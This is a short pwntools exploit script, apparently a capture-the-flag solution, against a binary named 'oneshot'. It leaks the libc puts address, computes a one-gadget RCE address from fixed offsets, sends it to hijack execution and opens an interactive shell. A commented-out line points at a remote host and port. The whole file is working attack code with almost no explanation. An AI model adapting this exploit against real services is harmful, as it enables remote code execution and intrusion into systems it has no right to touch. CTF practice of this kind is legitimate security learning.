
from pwn import *
#context.log_level = "debug"
puts_addr = 0x000000000006FD60
binsh_addr = 0x00000000000E66BD
#r = remote("59.110.6.128", 10086)#pwn
r = process("./oneshot")
r.sendline(str(0x600AD8))
r.recvuntil("Value: ")
data = r.recvuntil("\n").replace("\n","")
puts_addr = int(data,16)
print "[*] puts addr:{0}".format(hex(puts_addr))
one_shot_rce = puts_addr - 0x00000000006fd60 + 0x00000000000E66BD  #one gadget rce addr 
r.sendline(str(one_shot_rce))
r.interactive()
